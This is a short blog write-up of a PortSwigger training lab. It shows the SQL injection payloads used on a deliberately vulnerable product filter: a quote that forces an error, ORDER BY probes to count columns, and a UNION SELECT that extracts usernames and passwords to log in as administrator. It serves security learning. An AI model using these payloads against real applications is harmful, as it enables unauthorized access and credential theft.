---
layout: post
title: "SQL injection UNION attack, retrieving data from other tables [Write-up]"
date: 2026-06-30
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** SQL injection UNION attack, retrieving data from other tables

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description 

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Solution

This task is incredibly simple because the description has already provided us with all the information we need—namely, the table name and column names—and all we have to do is use that information. 

But let's still perform a basic check—specifically, let's display an error message and verify the number of columns.

```python
Lifestyle'
```

We're getting a 500 error

And I'll set the number of columns

```python
Lifestyle'+ORDER+BY+1+--   200
Lifestyle'+ORDER+BY+2+--   200
Lifestyle'+ORDER+BY+3+--   500
```

We extract the data from the two columns in Table 2 and based on the description 

```python
'+UNION+SELECT+username,+password+FROM+users+--
```

Enter the administrator's credentials and complete the lab 

